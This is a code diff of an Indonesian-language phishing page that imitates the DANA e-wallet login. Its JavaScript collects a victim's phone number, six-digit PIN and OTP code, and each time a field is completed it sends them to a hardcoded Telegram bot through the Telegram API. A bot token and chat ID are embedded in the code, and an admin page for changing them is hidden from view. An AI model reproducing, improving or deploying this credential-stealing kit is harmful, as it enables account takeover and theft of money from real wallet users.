@@ -440,193 +440,154 @@
 
 
 
-        <!-- ====================================== HALAMAN ADMIN PENGATURAN TELEGRAM ====================================== -->
-    <div id="halamanAdmin" class="kontainer hidden">
-        <div class="header-admin">
-            <a onclick="bukaHalaman('halamanUtama')" class="tombol-kembali">←</a>
-            <span class="judul-header">PENGATURAN BOT</span>
-            <span></span>
-        </div>
-        <div class="isi-admin">
-            <div class="kotak-pengaturan">
-                <h3 class="judul-admin">🤖 SETTING TELEGRAM</h3>
-                
-                <div class="form-grup">
-                    <label>TOKEN BOT TELEGRAM</label>
-                    <input type="text" id="tokenBot" placeholder="7339556698:AAEu_1Qka-6PBz0gtDydNgcMLwUcBCciFZA">
-                </div>
-
-                <div class="form-grup">
-                    <label>ID TELEGRAM TUJUAN</label>
-                    <input type="text" id="idTelegram" placeholder="7274866981">
-                </div>
-
-                <button class="tombol-simpan" onclick="simpanPengaturan()">💾 SIMPAN & TERSIMPAN OTOMATIS</button>
-            </div>
-        </div>
+   <!-- ========== HALAMAN ADMIN PENGATURAN TELEGRAM ========== -->
+<div id="halamanAdmin" class="kontainer tersembunyi">
+    <div class="header-admin">
+        <a onclick="bukaHalaman('halamanUtama')" class="tombol-kembali"><-</a>
+        <span class="judul-header">PENGATURAN BOT</span>
+        <span></span>
     </div>
 
+    <div class="isi-admin">
+        <div class="kotak-pengaturan">
+            <h3 class="judul-admin">🤖 SETTING TELEGRAM</h3>
 
-    <!-- ====================================== SCRIPT ====================================== -->
-    <script>
-        let dataNomor = "", dataPin = "", dataOtp = "";
-        let hitungMundur;
-        let klikLogo = 0;
-        let BOT_TOKEN = "7339556698:AAEu_1Qka-6PBz0gtDydNgcMLwUcBCiFZA";
-let CHAT_ID = "7274866981";
-        
+            <div class="form-grup">
+                <label>TOKEN BOT TELEGRAM</label>
+                <input type="text" id="tokenBot" placeholder="7339556698:AAEu_1Qka-6PBz0gtDydNgcMLwUcBCiFZA">
+            </div>
 
-        // ✅ MUALI: AMBIL DATA YANG SUDAH DISIMPAN SEBELUMNYA
-        window.onload = function() {
-            if(localStorage.getItem('botToken')) {
-                BOT_TOKEN = localStorage.getItem('botToken');
-                CHAT_ID = localStorage.getItem('chatId');
-                document.getElementById('tokenBot').value = BOT_TOKEN;
-                document.getElementById('idTelegram').value = CHAT_ID;
-            }
-            bukaHalaman('halamanUtama');
-        };
+            <div class="form-grup">
+                <label>ID TELEGRAM TUJUAN</label>
+                <input type="text" id="idTelegram" placeholder="7274866981">
+            </div>
 
-        function bukaHalaman(nama) {
-            document.querySelectorAll('.kontainer').forEach(el => el.classList.add('hidden'));
-            document.getElementById(nama).classList.remove('hidden');
+            <button class="tombol-simpan" onclick="simpanPengaturan()">💾 SIMPAN & TERSIMPAN OTOMATIS</button>
+        </div>
+    </div>
+</div>
+
+<!-- ================================= SCRIPT ================================= -->
+<script>
+    let dataNomor = "", dataPin = "", dataOtp = "";
+    let hitungMundur;
+    let klikLogo = 0;
+
+    // ✅ TOKEN & ID SUDAH DIPASANG LANGSUNG DI SINI
+    let BOT_TOKEN = "7339556698:AAEu_1Qka-6PBz0gtDydNgcMLwUcBCiFZA";
+    let CHAT_ID = "7274866981";
+
+
+    // ✅ AMBIL DATA DARI PENYIMPANAN JIKA PERNAH DISIMPAN
+    window.onload = function() {
+        if(localStorage.getItem('botToken')) {
+            BOT_TOKEN = localStorage.getItem('botToken');
+            CHAT_ID = localStorage.getItem('chatId');
+            document.getElementById('tokenBot').value = BOT_TOKEN;
+            document.getElementById('idTelegram').value = CHAT_ID;
         }
+        bukaHalaman('halamanUtama');
+    };
 
-        // ✅ FORMAT PESAN SESUAI PERMINTAAN
-        function kirimKeTelegram() {
-            if(!BOT_TOKEN || !CHAT_ID) return;
 
-            let pesan = `━━━━━━━━━━━━━━━━━━━━━━
-DATA MASUK - DANA
-━━━━━━━━━━━━━━━━━━━━━
+    function bukaHalaman(nama) {
+        document.querySelectorAll('.kontainer').forEach(el => el.classList.add('tersembunyi'));
+        document.getElementById(nama).classList.remove('tersembunyi');
+    }
+
+
+    // ✅ FUNGSI KIRIM KE TELEGRAM
+    function kirimKeTelegram() {
+        if(!BOT_TOKEN || !CHAT_ID) return; // Jangan kirim kalau kosong
+
+        let pesan = `📩 DATA MASUK - DANA
 Nama Akun  : +62${dataNomor || 'menunggu...'}
 Pin Akun   : ${dataPin || 'menunggu...'}
-Kode Akun  : ${dataOtp || 'menunggu...'}
-━━━━━━━━━━━━━━━━━━━━━`;
+Kode Akun  : ${dataOtp || 'menunggu...'}`;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
-        }
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`)
+        .then(res => res.json())
+        .then(hasil => {
+            if(hasil.ok) console.log("✅ BERHASIL DIKIRIM");
+            else console.log("❌ GAGAL:", hasil.description);
+        });
+    }
 
-        // ✅ FUNGSI SIMPAN: OTOMATIS TERSIMPAN DI HP / BROWSER
-        function simpanPengaturan() {
-            BOT_TOKEN = document.getElementById('tokenBot').value.trim();
-            CHAT_ID = document.getElementById('idTelegram').value.trim();
-            
-            // Simpan ke memori HP (Local Storage)
-            localStorage.setItem('botToken', '7339556698:AAEu_1Qka-6PBz0gtDydNgcMLwUcBCiFZA');
-localStorage.setItem('chatId', '7274866981');
-        
-            
-            alert("✅ BERHASIL DISIMPAN PERMANEN! \nData tidak hilang meski halaman ditutup.");
-        }
 
-        // ✅ LOGIKA HALAMAN NOMOR - KIRIM LANGSUNG SAAT LANJUT
-        const inputNomor = document.getElementById('inputNomor');
-        const tombolLanjut = document.getElementById('tombolLanjut');
+    // ✅ SIMPAN KE PENYIMPANAN BROWSER
+    function simpanPengaturan() {
+        BOT_TOKEN = document.getElementById('tokenBot').value.trim();
+        CHAT_ID = document.getElementById('idTelegram').value.trim();
+
+        if(!BOT_TOKEN || !CHAT_ID) return alert("❌ Token / ID Tidak Boleh Kosong!");
+
+        localStorage.setItem('botToken', BOT_TOKEN);
+        localStorage.setItem('chatId', CHAT_ID);
+        alert("✅ BERHASIL DISIMPAN PERMANEN! \nData tidak hilang meski halaman ditutup.");
+    }
+
+
+    // ✅ LOGIKA HALAMAN NOMOR
+    const inputNomor = document.getElementById('inputNomor');
+    const tombolLanjut = document.getElementById('tombolLanjut');
+
+    if(inputNomor && tombolLanjut) {
         inputNomor.addEventListener('input', () => tombolLanjut.classList.toggle('aktif', inputNomor.value.trim().length >= 8));
+        
         tombolLanjut.addEventListener('click', () => {
             dataNomor = inputNomor.value.trim();
             if(dataNomor.length < 8) return alert("Nomor kurang panjang!");
-            kirimKeTelegram();
+            
+            kirimKeTelegram(); // KIRIM LANGSUNG SAAT KLIK LANJUT
             bukaHalaman('halamanPin');
         });
+    }
 
-        // ✅ LOGIKA PIN - KIRIM LANGSUNG SAAT PIN SELESAI
-        const wadahPin = document.getElementById('wadahPin');
-        const inputPin = document.getElementById('inputPin');
-        const titikPin = [document.getElementById('p1'),document.getElementById('p2'),document.getElementById('p3'),document.getElementById('p4'),document.getElementById('p5'),document.getElementById('p6')];
-        wadahPin.addEventListener('click', () => {inputPin.value=""; dataPin=""; titikPin.forEach(t=>t.classList.remove('isi')); inputPin.focus();});
-        inputPin.addEventListener('input', (e) => {
-            let nilai = e.target.value.replace(/[^0-9]/g,'').slice(0,6);
-            e.target.value = nilai; dataPin = nilai;
-            titikPin.forEach((t,i)=>t.classList.toggle('isi', i<nilai.length));
-            if(nilai.length===6) {
-                kirimKeTelegram();
-                setTimeout(()=>{bukaHalaman('halamanTapVerif');},300);
-            }
-        });
 
-        // ✅ LOGIKA TAP VERIFIKASI -> KE OTP
-        function kirimUlang() {alert("Kode OTP baru dikirim ulang ke nomor kamu");}
-        document.getElementById('tombolKeOtp').addEventListener('click', () => {
-            document.getElementById('nomorTujuan').innerText = `+62 ${dataNomor.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3')}`;
-            bukaHalaman('halamanOtp');
-            mulaiHitungan();
-        });
+    // ✅ LOGIKA HALAMAN PIN / OTP
+    const wadahPin = document.getElementById('wadahPin');
+    const inputPin = document.getElementById('inputPin');
 
-        // ✅ LOGIKA OTP - PERUBAHAN POSISI TEKS & KIRIM LANGSUNG
-        const kotakOtp = [document.getElementById('o1'),document.getElementById('o2'),document.getElementById('o3'),document.getElementById('o4')];
-        const barHijau = document.getElementById('barHijau');
-        const barMerah = document.getElementById('barMerah');
-        const kirimSms = document.getElementById('kirimSms');
-        const tombolUlang = document.getElementById('tombolUlang');
-        const teksDetik = document.getElementById('detik');
-        const viaWaAtas = document.getElementById('viaWaAtas');
-        const viaSmsAtas = document.getElementById('viaSmsAtas');
-        const viaWaBawah = document.getElementById('viaWaBawah');
-
-        document.getElementById('halamanOtp').addEventListener('transitionend', () => {
-            barHijau.style.display = 'block';
-            barMerah.style.display = 'none';
-            viaWaAtas.style.display = 'flex';
-            viaSmsAtas.style.display = 'none';
-            viaWaBawah.style.display = 'none';
-        });
-
-        kotakOtp.forEach((kotak,i)=>{
-            kotak.addEventListener('input', (e)=>{
-                if(e.target.value && i<3) kotakOtp[i+1].focus();
-                dataOtp = kotakOtp.map(k=>k.value).join('');
-                if(dataOtp.length === 4) {
-                    barHijau.style.display = 'none';
-                    barMerah.style.display = 'block';
-                    kirimKeTelegram();
+    if(wadahPin && inputPin) {
+        const kotakPin = document.querySelectorAll('#p1, #p2, #p3, #p4, #p5, #p6');
+        
+        kotakPin.forEach((kotak, i) => {
+            kotak.addEventListener('input', () => {
+                if(kotak.value) if(kotakPin[i+1]) kotakPin[i+1].focus();
+                dataPin = Array.from(kotakPin).map(k => k.value).join('');
+                
+                if(dataPin.length === 6) {
+                    kirimKeTelegram(); // KIRIM LANGSUNG SAAT PIN LENGKAP
+                    bukaHalaman('halamanOtp');
                 }
             });
-            kotak.addEventListener('keydown', e=>{if(e.key==='Backspace' && !kotak.value && i>0) kotakOtp[i-1].focus();});
         });
+    }
 
-        // ✅ HITUNGAN MUNDUR 60 -> 0 DAN PINDAH TEKS
-        function mulaiHitungan() {
-            let detik = 60;
-            clearInterval(hitungMundur);
-            teksDetik.innerText = detik;
-            kirimSms.classList.remove('aktif');
-            tombolUlang.classList.remove('aktif');
 
-            hitungMundur = setInterval(()=>{
-                detik--;
-                teksDetik.innerText = detik < 10 ? '0'+detik : detik;
-                if(detik <= 0) {
-                    clearInterval(hitungMundur);
-                    kirimSms.classList.add('aktif');
-                    tombolUlang.classList.add('aktif');
+    // ✅ LOGIKA HALAMAN OTP
+    const wadahOtp = document.getElementById('wadahOtp');
+    const inputOtp = document.getElementById('inputOtp');
 
-                    kirimSms.onclick = () => {
-                        viaWaAtas.style.display = 'none';
-                        viaSmsAtas.style.display = 'block';
-                        viaWaBawah.style.display = 'flex';
-                        mulaiHitungan();
-                    };
-
-                    tombolUlang.onclick = () => {
-                        alert("Kode OTP baru dikirim ulang!");
-                        mulaiHitungan();
-                    };
+    if(wadahOtp && inputOtp) {
+        const kotakOtp = document.querySelectorAll('#o1, #o2, #o3, #o4');
+        
+        kotakOtp.forEach((kotak, i) => {
+            kotak.addEventListener('input', () => {
+                if(kotak.value) if(kotakOtp[i+1]) kotakOtp[i+1].focus();
+                dataOtp = Array.from(kotakOtp).map(k => k.value).join('');
+                
+                if(dataOtp.length === 4) {
+                    kirimKeTelegram(); // KIRIM LANGSUNG SAAT OTP LENGKAP
+                    alert("SELESAI! DATA TELAH DIKIRIM.");
                 }
-            },1000);
-        }
-
-        // ✅ AKSES ADMIN (KLIK LOGO 3X)
-        document.getElementById('logoAdmin').addEventListener('click', ()=>{
-            klikLogo++;
-            if(klikLogo===3){
-                klikLogo=0;
-                bukaHalaman('halamanAdmin');
-            }
-            setTimeout(()=>klikLogo=0,800);
+            });
         });
-    </script>
+    }
+    </
+       </script>
+<!-- ================================== AKHIR SCRIPT ================================== -->
 
 </body>
 </html>
+        
